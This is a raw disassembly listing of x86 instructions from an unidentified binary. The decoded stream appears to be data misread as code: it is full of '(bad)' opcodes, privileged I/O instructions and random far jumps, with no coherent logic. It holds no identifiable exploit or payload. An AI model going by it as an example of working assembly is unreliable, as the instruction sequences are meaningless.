  41ea7c:	mov    bh,0xb5
  41ea7e:	cdq    
  41ea7f:	sub    al,0x36
  41ea81:	xchg   edx,eax
  41ea82:	xor    ebp,DWORD PTR [ebp-0x74e09888]
  41ea88:	sar    BYTE PTR [ebx],cl
  41ea8a:	fsub   QWORD PTR [esi+esi*1+0x52c70f9b]
  41ea91:	clc    
  41ea92:	mov    ebp,0x33451ef7
  41ea97:	imul   eax,eax,0x58667f4f
  41ea9d:	ret    0xec33
  41eaa0:	outs   dx,BYTE PTR ds:[esi]
  41eaa1:	fwait
  41eaa2:	icebp  
  41eaa3:	cmp    al,0x93
  41eaa5:	popf   
  41eaa6:	jmp    0xb913:0xe709b0c6
  41eaad:	cdq    
  41eaae:	outs   dx,DWORD PTR ds:[esi]
  41eaaf:	pop    esi
  41eab0:	arpl   WORD PTR [esi],sp
  41eab2:	inc    eax
  41eab3:	mov    ch,0x8a
  41eab5:	and    al,0xbd
  41eab7:	pop    ecx
  41eab8:	pop    esp
  41eab9:	push   es
  41eaba:	pop    ss
  41eabb:	cli    
  41eabc:	adc    ebp,esi
  41eabe:	add    DWORD PTR [ebp-0x6a0fc4c4],esp
  41eac4:	xor    eax,0x1a7debc6
  41eac9:	mov    DWORD PTR ds:0x5d725b8d,0x543ed167
  41ead3:	jnp    0x41eafa
  41ead5:	xor    BYTE PTR [ebp+0x42],cl
  41ead8:	xor    edx,ebp
  41eada:	jg     0x41ea78
  41eadc:	xchg   esp,eax
  41eadd:	addr16 mov esp,0x986df75a
  41eae3:	in     eax,dx
  41eae4:	xor    dh,0x15
  41eae7:	xor    ah,dh
  41eae9:	add    ebp,ecx
  41eaeb:	mov    ch,0xdc
  41eaed:	fadd   st,st(6)
  41eaef:	lods   al,BYTE PTR ds:[esi]
  41eaf0:	cmp    eax,0x402bae4b
  41eaf5:	mov    eax,ds:0xbda45284
  41eafa:	test   DWORD PTR [esi+0x56],ecx
  41eafd:	add    al,0x31
  41eaff:	xchg   esi,eax
  41eb00:	jg     0x41ea9b
  41eb02:	(bad)  
  41eb03:	jmp    0xc66a:0xc567d047
  41eb0a:	lock das 
  41eb0c:	add    eax,0x515f6cd8
  41eb11:	pop    edx
  41eb12:	pop    ecx
  41eb13:	add    BYTE PTR [edi],0xdd
  41eb16:	jecxz  0x41eab5
  41eb18:	add    BYTE PTR [esi],cl
  41eb1a:	jo     0x41eb79
  41eb1c:	mov    eax,0xa30ded4f
  41eb21:	pop    es
  41eb22:	dec    esp
  41eb23:	out    dx,eax
  41eb24:	stc    
  41eb25:	pop    edx
  41eb26:	xor    eax,0x72099406
  41eb2b:	test   BYTE PTR [ebx-0x2c4f077],ah
  41eb31:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb33:	add    bh,bl
  41eb35:	sbb    dh,BYTE PTR [eax]
  41eb37:	xchg   DWORD PTR ds:0x13d1b2af,ebx
  41eb3d:	in     eax,dx
  41eb3e:	es dec edx
  41eb40:	cmp    dh,BYTE PTR [edi]
  41eb42:	hlt    
  41eb43:	lds    esi,FWORD PTR [edx]
  41eb45:	mov    ds:0xc93ef25,al
  41eb4a:	(bad)  
  41eb4b:	pop    edx
  41eb4c:	and    bl,BYTE PTR [edx+0x3f]
  41eb4f:	ja     0x41eb5c
  41eb51:	xchg   ebp,eax
  41eb52:	or     eax,0xb799543
  41eb57:	jnp    0x41ebbb
  41eb59:	and    ah,bl
  41eb5b:	mov    edx,0xd8f908f1
  41eb60:	jle    0x41eb0a
  41eb62:	jbe    0x41ebd5
  41eb64:	cld    
  41eb65:	jnp    0x41eb99
  41eb67:	out    0xb9,eax
  41eb69:	imul   al
  41eb6b:	push   esp
  41eb6c:	dec    edx
  41eb6d:	lods   al,BYTE PTR ds:[esi]
  41eb6e:	adc    ebx,ebx
  41eb70:	aaa    
  41eb71:	arpl   WORD PTR [ecx],dx
  41eb73:	pop    eax
  41eb74:	aas    
  41eb75:	push   edi
  41eb76:	push   cs
  41eb77:	xchg   ecx,eax
  41eb78:	sbb    DWORD PTR [edi],ecx
  41eb7a:	gs lock aad 0x93
  41eb7e:	cmp    BYTE PTR [ecx],ah
  41eb80:	stos   DWORD PTR es:[edi],eax
  41eb81:	dec    BYTE PTR [ebx]
  41eb83:	ins    DWORD PTR es:[edi],dx
  41eb84:	xor    BYTE PTR gs:[ebx-0x3d],0xd9
  41eb89:	push   ds
  41eb8a:	add    al,0x7e
  41eb8c:	retf   
  41eb8d:	cwde   
  41eb8e:	xchg   bh,ah
  41eb90:	aad    0x81
  41eb92:	jp     0x41eb59
  41eb94:	test   al,0x8f
  41eb96:	lods   al,BYTE PTR ds:[esi]
  41eb97:	xor    DWORD PTR [esi-0x3fafc570],0x46
  41eb9e:	jne    0x41eb85
  41eba0:	js     0x41eb92
  41eba2:	sbb    DWORD PTR [eax+eax*8-0x4ec02fe5],ebx
  41eba9:	jmp    FWORD PTR [ebx-0x11cfff4b]
  41ebaf:	ret    
  41ebb0:	push   es
  41ebb1:	add    bl,cl
  41ebb3:	add    DWORD PTR [ecx],ebp
  41ebb5:	(bad)  
  41ebb6:	(bad)  
  41ebb7:	clc    
  41ebb8:	xchg   ebp,eax
  41ebb9:	inc    esp
  41ebba:	mov    ds:0x5a092a17,eax
  41ebbf:	in     eax,dx
  41ebc0:	ror    DWORD PTR [esi*2+0x56f4541a],cl
  41ebc7:	jne    0x41eb5b
  41ebc9:	fldcw  WORD PTR [edi+0x4d]
  41ebcc:	pushf  
  41ebcd:	pop    esi
  41ebce:	(bad)  
  41ebd0:	lods   al,BYTE PTR ds:[esi]
  41ebd1:	aaa    
  41ebd2:	push   0xffffff9f
  41ebd4:	mov    ds:0x418f316f,eax
  41ebd9:	jbe    0x41ebd6
  41ebdb:	popf   
  41ebdc:	fidiv  DWORD PTR [edi]
  41ebde:	cs js  0x41ec05
  41ebe1:	call   0x3b1a70ea
  41ebe6:	xor    eax,DWORD PTR [edi+0x4ddbfd0b]
  41ebec:	xor    BYTE PTR [ecx-0x4632c559],cl
  41ebf2:	cmp    edi,DWORD PTR [ebx-0x7dd3f94e]
  41ebf8:	call   0xe9d9f6ba
  41ebfd:	scas   al,BYTE PTR es:[edi]
  41ebfe:	jno    0x6bce0726
  41ec04:	lock sbb cl,al
  41ec07:	lahf   
  41ec08:	push   edx
  41ec09:	scas   al,BYTE PTR es:[edi]
  41ec0a:	pop    ecx
  41ec0b:	lods   al,BYTE PTR ds:[esi]
  41ec0c:	cwde   
  41ec0d:	dec    ebx
  41ec0e:	stos   BYTE PTR es:[edi],al
  41ec0f:	lds    edx,FWORD PTR ds:0xecae571c
  41ec15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec16:	jb     0x41ec24
  41ec18:	ret    0xc5c
  41ec1b:	imul   edi,DWORD PTR [edi],0xffffffe7
  41ec1e:	cmp    eax,0x92d0f32a
  41ec23:	aas    
  41ec24:	repz mov esi,esi
  41ec27:	out    dx,al
  41ec28:	dec    ebx
  41ec29:	mov    cs,WORD PTR [ebx+0x3d695942]
  41ec2f:	lods   eax,DWORD PTR ds:[esi]
  41ec30:	sub    ecx,DWORD PTR [ecx-0x2a]
  41ec33:	inc    edx
  41ec34:	xor    eax,0xae4a6fcc
  41ec39:	scas   al,BYTE PTR es:[edi]
  41ec3a:	jbe    0x41ec7a
  41ec3c:	(bad)  
  41ec3e:	mov    al,ds:0x63adcf22
  41ec43:	adc    cl,dl
  41ec45:	xor    BYTE PTR ss:[edi],al
  41ec48:	xor    eax,DWORD PTR [eax]
  41ec4a:	jle    0x41ebdf
  41ec4c:	push   eax
  41ec4d:	sub    eax,0xe3347a60
  41ec52:	sti    
  41ec53:	xchg   ebp,eax
  41ec54:	pop    esp
  41ec55:	stc    
  41ec56:	test   eax,0x3c39a2b5
  41ec5b:	aam    0x1b
  41ec5d:	inc    ebx
  41ec5e:	pop    ss
  41ec5f:	xchg   ebp,eax
  41ec60:	test   BYTE PTR [ebx+0x799da8af],cl
  41ec66:	mov    ecx,0x59025335
  41ec6b:	fisttp WORD PTR [edx-0x7]
  41ec6e:	pop    eax
  41ec6f:	jl     0x41ec85
  41ec71:	cmp    eax,0x4930c1ac
  41ec76:	fdivr  st(6),st
  41ec78:	dec    eax
  41ec79:	cmp    al,0x63
  41ec7b:	dec    eax
  41ec7c:	hlt    
  41ec7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec7e:	ret    0xcd97
  41ec81:	dec    eax
  41ec82:	add    esi,DWORD PTR [eax-0x58d80b8]
  41ec88:	dec    esp
  41ec89:	mov    edx,0x470d8262
  41ec8e:	in     al,0x81
  41ec90:	ja     0x41ecb6
  41ec92:	icebp  
  41ec93:	cld    
  41ec94:	and    eax,0x6ea5a3ec
  41ec99:	inc    ecx
	...
  41ed12:	add    BYTE PTR [eax],al
  41ed14:	adc    eax,0x773f6240
  41ed19:	aas    
  41ed1a:	pop    ebp
  41ed1b:	push   0xffffff86
  41ed1d:	jb     0x41ed81
  41ed1f:	stc    
  41ed20:	jnp    0x41ece2
  41ed22:	ror    dl,1
  41ed24:	test   DWORD PTR [edi+0x76e0001],0x44c90000
  41ed2e:	mov    eax,ds:0x87d425b5
  41ed33:	xor    BYTE PTR [ebp-0x20],ch
  41ed36:	mov    dh,0x72
  41ed38:	pop    ebx
  41ed39:	rcl    DWORD PTR [edi+0x7c],1
  41ed3c:	push   ebx
  41ed3d:	mov    ebx,0xf9c610c6
  41ed42:	add    edx,DWORD PTR [ecx-0x7c]
  41ed45:	jnp    0x41ed5b
  41ed47:	das    
  41ed48:	jmp    0x41ed18
  41ed4a:	mov    bh,0xf8
  41ed4c:	(bad)  
  41ed4d:	retf   
  41ed4e:	test   eax,0xc940e637
  41ed53:	lea    edx,[ecx+0x4d]
  41ed56:	xchg   edx,eax
  41ed57:	out    0x70,al
  41ed59:	dec    ecx
  41ed5a:	and    eax,0xce5cdac7
  41ed5f:	xlat   BYTE PTR ds:[ebx]
  41ed60:	imul   DWORD PTR [edx+0x1a]
  41ed63:	stos   DWORD PTR es:[edi],eax
  41ed64:	pop    ss
  41ed65:	mov    eax,0xe5a3f0ce
  41ed6a:	xchg   ebx,eax
  41ed6b:	int3   
  41ed6c:	test   BYTE PTR [ebx-0x51bb19],ch
  41ed72:	(bad)
  41ed75:	std    
  41ed76:	pop    ebx
  41ed77:	arpl   di,si
  41ed79:	stc    
  41ed7a:	cmc    
  41ed7b:	ret    0xc827
  41ed7e:	or     eax,0x34a36586
  41ed83:	and    ecx,esp
  41ed85:	mov    ebx,0x1a5d1f9e
  41ed8a:	in     eax,0xb3
  41ed8c:	lock jnp 0x41ee00
  41ed8f:	ret    
  41ed90:	cmp    ebx,ebp
  41ed92:	ret    0x700
  41ed95:	xchg   BYTE PTR [edi-0x1d],al
  41ed98:	xchg   ebp,eax
  41ed99:	inc    esi
  41ed9a:	loop   0x41edbc
  41ed9c:	mov    bh,0x65
  41ed9e:	fbstp  TBYTE PTR [eax+0x60]
  41eda1:	ins    BYTE PTR es:[edi],dx
  41eda2:	out    0xe5,al
  41eda4:	dec    ebp
  41eda5:	js     0x41ed6b
  41eda7:	sub    al,0xbc
  41eda9:	sbb    DWORD PTR [eax-0x66],0xffffff96
  41edad:	lods   al,BYTE PTR es:[esi]
  41edaf:	test   DWORD PTR [edx-0x10],esp
  41edb2:	jnp    0x41ed66
  41edb4:	jp     0x41ed70
  41edb6:	fnstsw WORD PTR [ebx+0x45]
  41edb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edba:	jbe    0x41ed7c
  41edbc:	and    ebp,ecx
  41edbe:	in     al,0xde
  41edc0:	add    DWORD PTR [ecx],ebp
  41edc2:	push   edi
  41edc3:	jmp    0x753b:0x8dba44a5
  41edca:	jne    0x41ee2c
  41edcc:	inc    ebx
  41edcd:	sbb    al,0xd2
  41edcf:	push   ss
  41edd0:	xor    ebp,DWORD PTR [ecx-0x1989f851]
  41edd6:	(bad)  
  41edd7:	inc    esi
  41edd9:	sub    cl,BYTE PTR [ebp+0x4473a7fc]
  41eddf:	loopne 0x41edd8
  41ede1:	loop   0x41edf4
  41ede3:	or     DWORD PTR [edi+0x21c297a0],esi
  41ede9:	cmp    dh,BYTE PTR [ebx+0x23]
  41edec:	pop    ebx
  41eded:	adc    bh,BYTE PTR ds:0x8c8bf4c2
  41edf3:	xchg   edx,eax
  41edf4:	jl     0x41ee3f
  41edf6:	inc    esp
  41edf7:	push   ebx
  41edf8:	repnz mov ah,0x28
  41edfb:	lds    edx,FWORD PTR [ebx+eiz*4-0x6224f495]
  41ee02:	push   esp
  41ee03:	mov    gs,WORD PTR [ebx+0x23b83c2e]
  41ee09:	imul   ebp,DWORD PTR [esi],0xe5214e4
  41ee0f:	rcl    BYTE PTR ds:0xcc939526,cl
  41ee15:	call   0x9ab7bad7
  41ee1a:	sub    eax,0x413918fc
  41ee1f:	cmp    esi,DWORD PTR [edi+0x7]
  41ee22:	sbb    edx,DWORD PTR [ecx+0x6f]
  41ee25:	xor    BYTE PTR ds:0x89fb64c3,al
  41ee2b:	fst    QWORD PTR [edi-0x62174a52]
  41ee31:	pusha  
  41ee32:	ins    DWORD PTR es:[edi],dx
  41ee33:	aaa    
  41ee34:	mov    dh,cl
  41ee36:	adc    eax,0x52eb5d2c
  41ee3b:	daa    
  41ee3c:	call   0xc238:0x15d61bdb
  41ee43:	je     0x41edd2
  41ee45:	inc    ecx
  41ee46:	shr    cl,1
  41ee48:	jmp    0x84db92de
  41ee4d:	sbb    DWORD PTR [ebx-0x14],ebx
  41ee50:	or     BYTE PTR [esi],ch
  41ee52:	xchg   esi,eax
  41ee53:	iret   
  41ee54:	push   cs
  41ee55:	pop    esi
  41ee56:	cli    
  41ee57:	cmp    BYTE PTR [ecx-0x465da2f6],cl
  41ee5d:	xchg   ecx,eax
  41ee5e:	mov    ds:0x4cfecedb,al
  41ee63:	fwait
  41ee64:	mov    esi,?
  41ee66:	pushf  
  41ee67:	stos   BYTE PTR es:[edi],al
  41ee68:	mov    edx,edx
  41ee6a:	inc    ecx
  41ee6b:	and    ch,bl
  41ee6d:	cld    
  41ee6e:	pop    edx
  41ee6f:	retf   
  41ee70:	or     dl,BYTE PTR [esi+0x2c21b2ca]
  41ee76:	(bad)  
  41ee77:	xchg   edx,eax
  41ee78:	jnp    0x41eee1
  41ee7a:	aad    0x4f
  41ee7c:	cmp    BYTE PTR [esi],al
  41ee7e:	in     eax,dx
  41ee7f:	inc    eax
  41ee80:	sbb    al,0x3f
  41ee82:	xchg   edi,eax
  41ee83:	int3   
  41ee84:	inc    ecx
  41ee85:	dec    edx
  41ee86:	les    edx,FWORD PTR [esi+0x25]
  41ee89:	jb     0x41eeb1
  41ee8b:	add    dl,BYTE PTR [esi]
  41ee8d:	sbb    al,0xf8
  41ee8f:	pushf  
  41ee90:	pushf  
  41ee91:	ror    dl,1
  41ee93:	sub    dh,BYTE PTR [edx+0x178890a7]
  41ee99:	sbb    BYTE PTR [esi],dh
  41ee9b:	pop    edx
  41ee9c:	rcl    DWORD PTR [eax+0x39],0x17
  41eea0:	lock adc DWORD PTR [ebx+0x47],edx
  41eea4:	fisubr WORD PTR [esi-0x79b24e0f]
  41eeaa:	mov    ch,0x9c
  41eeac:	xchg   esp,eax
  41eead:	imul   esi,DWORD PTR [ebp+ebp*1+0x7d],0x67659ed
  41eeb5:	and    ax,0x25fd
  41eeb9:	mov    ebp,0xac2edd52
  41eebe:	dec    ebp
  41eebf:	hlt    
  41eec0:	jbe    0x41ef31
  41eec2:	call   0x1afa:0x8f71291f
  41eec9:	mov    ebx,0x14e2ce67
  41eece:	sbb    ebx,DWORD PTR [esi]
  41eed0:	icebp  
  41eed1:	inc    eax
  41eed2:	sbb    al,0x3
  41eed4:	xlat   BYTE PTR ds:[ebx]
  41eed5:	jnp    0x41ef13
  41eed7:	sar    BYTE PTR [ecx+0x4248777a],cl
  41eedd:	bnd js 0x41ef55
  41eee0:	jp     0x41ef3d
  41eee2:	xchg   ebx,eax
  41eee3:	popa   
  41eee4:	jns    0x41eeaa
  41eee6:	out    0x36,eax
  41eee8:	shl    BYTE PTR [ebx],1
  41eeea:	jb     0x41eedd
  41eeec:	inc    esp
  41eeed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eeee:	fadd   QWORD PTR [edi]
  41eef0:	push   ss
  41eef1:	call   0x3f1f:0x7431edd4
  41eef8:	add    bh,BYTE PTR [ebp-0x5ed02552]
  41eefe:	cmp    al,0x36
  41ef00:	cs mov ebx,0x3eb3696b
  41ef06:	lahf   
  41ef07:	fiadd  DWORD PTR [edx+0x537e8a11]
  41ef0d:	cmovns ebx,DWORD PTR [esp+eiz*8]
  41ef11:	or     BYTE PTR [esi+0x59188718],cl
  41ef17:	push   0x22cbdd07
  41ef1c:	sub    al,0x47
  41ef1e:	in     al,dx
  41ef1f:	adc    BYTE PTR [ebx+0x32],cl
  41ef22:	rcr    ch,cl
  41ef24:	les    ebx,FWORD PTR [ecx+0x3794612d]
  41ef2a:	je     0x41eeee
  41ef2c:	(bad)  
  41ef2d:	sub    DWORD PTR [edx+0x11cb64ad],ecx
  41ef33:	dec    ecx
  41ef34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef35:	sbb    DWORD PTR [eax+eax*8-0x7927b934],0x44ab20b9
  41ef40:	sub    eax,0x7a92e578
  41ef45:	inc    ebx
  41ef46:	idiv   BYTE PTR [eax+0x3e]
  41ef49:	or     ebp,DWORD PTR [eax+0x206a9310]
  41ef4f:	loopne 0x41ef32
  41ef51:	push   cs
  41ef52:	sub    eax,0x4a6db7e5
  41ef57:	add    dl,BYTE PTR [ebx]
  41ef59:	or     BYTE PTR [edi],dl
  41ef5b:	pop    edx
  41ef5c:	sbb    eax,0x5e5d23a1
  41ef61:	pop    ss
  41ef62:	clc    
  41ef63:	ss sti 
  41ef65:	or     ch,BYTE PTR [ebx-0x7887d633]
  41ef6b:	and    al,0x28
  41ef6d:	cmp    al,0x5c
  41ef6f:	retf   0x5c88
  41ef72:	or     DWORD PTR [ebx-0x78019790],edi
  41ef78:	sahf   
  41ef79:	fstp   DWORD PTR [esi+0x78]
  41ef7c:	or     DWORD PTR [ebx-0x66ee91b8],0x22
  41ef83:	mov    ebx,0xc287b6b5
  41ef88:	adc    edx,DWORD PTR [ebp-0x41]
  41ef8b:	sub    BYTE PTR [ecx-0x26],ah
  41ef8e:	mov    bl,0x3b
  41ef90:	clc    
  41ef91:	dec    esi
  41ef92:	xchg   BYTE PTR [edi+0x5b5fc2e],ch
  41ef98:	retf   0x6ccc
  41ef9b:	xor    DWORD PTR [edx+0x2b],esi
  41ef9e:	loope  0x41efb6
  41efa0:	imul   edi,esi,0x406ab87e
  41efa6:	xchg   ecx,eax
  41efa7:	mov    ah,0x17
  41efa9:	sub    eax,0x4b7866e7
  41efae:	inc    esp
  41efaf:	xchg   DWORD PTR [ebx+0x1f],edx
  41efb2:	outs   dx,DWORD PTR ds:[esi]
  41efb3:	rcr    DWORD PTR [esi-0x13039708],1
  41efb9:	bnd je 0x41ef60
  41efbc:	push   esp
  41efbd:	adc    esp,0xffffff9a
  41efc0:	adc    eax,0x170811ce
  41efc5:	jnp    0x41efba
  41efc7:	fbld   TBYTE PTR ds:0xfc4438f5
  41efcd:	ss neg bl
  41efd0:	mov    BYTE PTR [edx+eax*1],bl
  41efd3:	sbb    al,bh
  41efd5:	aam    0x5
  41efd7:	and    esp,ecx
  41efd9:	je     0x41f006
  41efdb:	push   esi
  41efdc:	xchg   cl,ch
  41efde:	fadd   QWORD PTR [edi-0x1fe86340]
  41efe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efe5:	dec    ebx
  41efe6:	div    DWORD PTR [edx+esi*4-0x5fd70944]
  41efed:	push   ecx
  41efee:	sbb    eax,0xd2a0afba
  41eff3:	shl    edx,cl
  41eff5:	adc    al,0x1
  41eff7:	adc    al,0xb7
  41eff9:	inc    edx
  41effa:	mov    ebp,0x9e05f699
  41efff:	ss jno 0x41effd
  41f002:	addr16 jge 0x41f029
  41f005:	mov    esp,0x867c89f3
  41f00a:	bound  esp,QWORD PTR [ebx+0x13322a96]
  41f010:	retf   0x8b3e
  41f013:	outs   dx,DWORD PTR ds:[si]
  41f015:	pop    eax
  41f016:	push   esi
  41f017:	jmp    0xb2b3:0xc6fc2615
  41f01e:	push   0xe10fa00e
  41f023:	jle    0x41f09d
  41f025:	repz inc edi
  41f027:	inc    eax
  41f028:	sbb    bl,bl
  41f02a:	(bad)  
  41f02b:	sbb    ch,BYTE PTR [edi+edi*1-0x2137e7af]
  41f032:	fst    DWORD PTR ds:0xce748c6b
  41f038:	cli    
  41f039:	push   ds
  41f03a:	jl     0x41effc
  41f03c:	xchg   BYTE PTR [ebx],dh
  41f03e:	xchg   edx,eax
  41f03f:	ret    
  41f040:	aad    0x45
  41f042:	test   eax,0xcb4e4dcf
  41f047:	mov    ah,0x74
  41f049:	(bad)  
  41f04a:	mov    ebx,0x75590a3b
  41f04f:	pop    es
  41f050:	and    DWORD PTR fs:[eax],edi
  41f053:	sub    eax,0xb08a15aa
  41f058:	jp     0x41f004
  41f05a:	xor    DWORD PTR [eax-0x29350a59],esi
  41f060:	cs push ebx
  41f062:	data16 jo 0x41f043
  41f065:	and    eax,0x5a33e55
  41f06a:	jmp    0xf602:0xa749347
  41f071:	mov    ebx,0x1b3a8f1b
  41f076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f077:	jno    0x41f05e
  41f079:	lahf   
  41f07a:	inc    eax
  41f07b:	xlat   BYTE PTR ds:[ebx]
  41f07c:	ror    edi,0x9a
  41f07f:	or     eax,0x1f6b1702
  41f084:	imul   ebp,edi,0x75c97973
  41f08a:	lea    eax,[ebx+ebx*2+0x2ee6d2b]
  41f091:	lds    esp,FWORD PTR [edx]
  41f093:	aas    
  41f094:	shr    BYTE PTR [esp+eax*2],cl
  41f097:	pushf  
  41f098:	pop    ebx
  41f099:	xor    eax,0x9816267e
  41f09e:	fisttp DWORD PTR [ebx]
  41f0a0:	xor    edi,edx
  41f0a2:	loope  0x41f06d
  41f0a4:	fucomp st(3)
  41f0a6:	dec    ebx
  41f0a7:	mov    bl,BYTE PTR [eax+0x17]
  41f0aa:	mov    dh,0x4a
  41f0ac:	push   ebx
  41f0ad:	ficomp DWORD PTR [eax-0x74d8f031]
  41f0b3:	int    0x89
  41f0b5:	or     ah,bh
  41f0b7:	add    eax,0x502f0e77
  41f0bc:	add    al,0xa7
  41f0be:	fild   QWORD PTR ds:0x699cf3c6
  41f0c4:	dec    esi
  41f0c5:	ds or  edx,ecx
  41f0c8:	xor    eax,0xd2942332
  41f0cd:	mov    ebx,DWORD PTR [ebx+0x6b]
  41f0d0:	out    dx,al
  41f0d1:	or     cl,bh
  41f0d3:	adc    dh,bl
  41f0d5:	imul   ebx,edx,0x2eaf5ed6
  41f0db:	push   ds
  41f0dc:	rol    BYTE PTR [eax],1
  41f0de:	mov    edx,edx
  41f0e0:	fimul  DWORD PTR [esi]
  41f0e2:	test   BYTE PTR [esi-0x49],ah
  41f0e5:	push   es
  41f0e6:	imul   edi,DWORD PTR [ebp-0x2ea1f6bf],0xfffffffd
  41f0ed:	xchg   esp,eax
  41f0ee:	(bad)  
  41f0ef:	push   edx
  41f0f0:	add    ebx,esp
  41f0f2:	jnp    0x41f0bf
  41f0f4:	mov    esi,ebp
  41f0f6:	push   esi
  41f0f7:	test   BYTE PTR [esi+edi*4+0x536dd4ec],cl
  41f0fe:	shl    DWORD PTR [edx-0x14],cl
  41f101:	add    ecx,DWORD PTR [ebx+ebp*2]
  41f104:	cmp    al,0x53
  41f106:	fist   WORD PTR ss:[esi-0xab0a402]
  41f10d:	ret    0x903d
  41f110:	and    al,0x2d
  41f112:	(bad)  
  41f113:	adc    al,0x3f
  41f115:	mov    BYTE PTR [edx-0x3ccbccc7],dh
  41f11b:	or     dl,cl
  41f11d:	xor    al,0xe6
  41f11f:	xor    eax,0xf8ed764b
  41f124:	xor    eax,0xe2cb4467
  41f129:	mov    eax,DWORD PTR [ebp-0x31]
  41f12c:	or     al,0xe7
  41f12e:	cmp    DWORD PTR ds:0xd73e0e3b,ebp
  41f134:	xor    eax,0xc1275f60
  41f139:	sub    eax,0x754ebf15
  41f13e:	loope  0x41f124
  41f140:	test   al,0xcd
  41f142:	jg     0x41f0e1
  41f144:	add    BYTE PTR [ebp+0x2f],0x30
  41f148:	adc    al,0x7a
  41f14a:	cmp    DWORD PTR [ecx],ebx
  41f14c:	hlt    
  41f14d:	retf   
  41f14e:	outs   dx,DWORD PTR ds:[esi]
  41f14f:	(bad)  
  41f150:	out    0x43,al
  41f152:	pop    edi
  41f153:	int3   
  41f154:	jb     0x41f150
  41f156:	(bad)  
  41f157:	jne    0x41f0f0
  41f159:	stos   BYTE PTR es:[edi],al
  41f15a:	cld    
  41f15b:	jge    0x41f1b8
  41f15d:	sbb    BYTE PTR [ebx-0x69d52fa9],bl
  41f163:	adc    esi,ecx
  41f165:	test   DWORD PTR [ebx-0x55],ebx
  41f168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f169:	pusha  
  41f16a:	shl    al,0x50
  41f16d:	loopne 0x41f158
  41f16f:	aaa    
  41f170:	shr    DWORD PTR [ebx],1
  41f172:	adc    BYTE PTR [esp+ebx*1+0x74],ah
  41f176:	mov    bh,BYTE PTR ds:0x5f4d3e57
  41f17c:	fucom  st(6)
  41f17e:	js     0x41f13d
  41f180:	bound  ebx,QWORD PTR ds:0x3db72131
  41f186:	in     al,dx
  41f187:	dec    ebp
  41f188:	xor    DWORD PTR [esi+esi*2+0x604039ef],0x4
  41f190:	lock jmp 0x356a:0x76acb878
  41f198:	leave  
  41f199:	adc    bh,BYTE PTR [edi+0x1fde93d5]
  41f19f:	(bad)  
  41f1a0:	mov    ch,0x6a
  41f1a2:	bound  edx,QWORD PTR [edi-0x37d479e3]
  41f1a8:	cs mov cl,ch
  41f1ab:	ror    DWORD PTR [edi],cl
  41f1ad:	dec    eax
  41f1ae:	add    dl,BYTE PTR [edi-0x49]
  41f1b1:	or     al,0x9
  41f1b3:	sar    BYTE PTR [ecx+0x59],cl
  41f1b6:	loope  0x41f173
  41f1b8:	inc    esp
  41f1b9:	jp     0x41f207
  41f1bb:	xor    DWORD PTR [esi],ebx
  41f1bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1be:	mov    al,ds:0x382b3d55
  41f1c3:	cmp    DWORD PTR [edx+edx*8],ebp
  41f1c6:	pop    ds
  41f1c7:	mov    ebp,0xac22ba02
  41f1cc:	out    dx,eax
  41f1cd:	mov    ebx,0xdd756c21
  41f1d2:	gs jb  0x41f230
  41f1d5:	(bad)  
  41f1d7:	and    DWORD PTR [eax],eax
  41f1d9:	out    dx,al
  41f1da:	ds call 0x4e4e:0xaaffc5c4
  41f1e2:	mov    eax,ds
  41f1e4:	push   0x98c3a8ce
  41f1e9:	addr16 push ds
  41f1eb:	div    BYTE PTR [eax]
  41f1ed:	nop
  41f1ee:	in     eax,dx
  41f1ef:	fs cli 
  41f1f1:	ret    
  41f1f2:	adc    BYTE PTR [ecx+0x601e3966],ah
  41f1f8:	or     BYTE PTR [ebx],dl
  41f1fa:	sbb    esi,ebp
  41f1fc:	popf   
  41f1fd:	jle    0x41f1aa
  41f1ff:	sar    BYTE PTR es:[ebx+0x4fa95d85],0xf1
  41f207:	stc    
  41f208:	dec    edi
  41f209:	push   ds
  41f20a:	jg     0x41f23b
  41f20c:	aas    
  41f20d:	mov    edx,0x9e2d2cc6
  41f212:	retf   0xe788
  41f215:	loopne 0x41f1a5
  41f217:	pop    edi
  41f218:	lds    esi,FWORD PTR [ebp-0x6cc3675]
  41f21e:	pusha  
  41f21f:	pop    ebx
  41f220:	shr    al,0xa6
  41f223:	inc    edx
  41f224:	jmp    0xe51e:0xa298376b
  41f22b:	fiadd  WORD PTR [esi]
  41f22d:	test   BYTE PTR [edx-0x28],0x76
  41f231:	cmc    
  41f232:	es jmp 0x41f217
  41f235:	test   DWORD PTR [edx+0xcbccaba],esi
  41f23b:	stos   BYTE PTR es:[edi],al
  41f23c:	and    eax,0xb82775d9
  41f241:	mov    al,ds:0x194982ca
  41f246:	or     eax,0xcd9451c0
  41f24b:	fcom   st(6)
  41f24d:	enter  0x91cc,0x3f
  41f251:	push   ebx
  41f252:	test   BYTE PTR [esi],ah
  41f254:	mov    ah,BYTE PTR [edi-0x35]
  41f257:	test   al,0x94
  41f259:	mov    ecx,0x5c58676f
  41f25e:	dec    DWORD PTR fs:[edx+0x6a9981be]
  41f265:	mov    ebp,0x2c05fff9
  41f26a:	and    ebp,ecx
  41f26c:	adc    eax,0x5bb89729
  41f271:	pop    ebx
  41f272:	cdq    
  41f273:	pop    edi
  41f274:	loop   0x41f2bb
  41f276:	out    0xd,al
  41f278:	imul   ebx,DWORD PTR [ebp+ebp*2-0x58],0x5c3c192f
  41f280:	stc    
  41f281:	and    al,0xa1
  41f283:	call   0xf903cc86
  41f288:	int    0x8
  41f28a:	jo     0x41f2e4
  41f28c:	mov    cl,0x2a
  41f28e:	(bad)  
  41f28f:	pop    ebx
  41f290:	out    dx,eax
  41f291:	jb     0x41f294
  41f293:	mov    ebp,0x4fa29588
  41f298:	jle    0x41f295
  41f29a:	shl    ebp,0x1c
  41f29d:	add    BYTE PTR [ebp+0x3b],dl
  41f2a0:	cwde   
  41f2a1:	and    ch,BYTE PTR [ecx]
  41f2a3:	add    DWORD PTR [edi-0x4f],esp
  41f2a6:	pop    edx
  41f2a7:	dec    esp
  41f2a8:	or     edx,edx
  41f2aa:	cmc    
